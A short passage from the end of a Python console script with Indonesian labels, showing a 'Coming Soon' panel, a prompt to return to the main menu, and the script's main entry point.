    printer(Panel(tamp_kesediaan,title=f'{U2}[  {P2}Coming  Soon  {U2}]',title_align='center',subtitle=f'{H2}[  {P2}See  You  {H2}]',subtitle_align='center',width=54,padding=(1,4),style='#00FF00'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(M,P,M))
    tampilan_menu()

if __name__ == '__main__':
    resik()
    tampilan_menu()

# print('%s[%s•%s] %s'%(J,P,J,P))
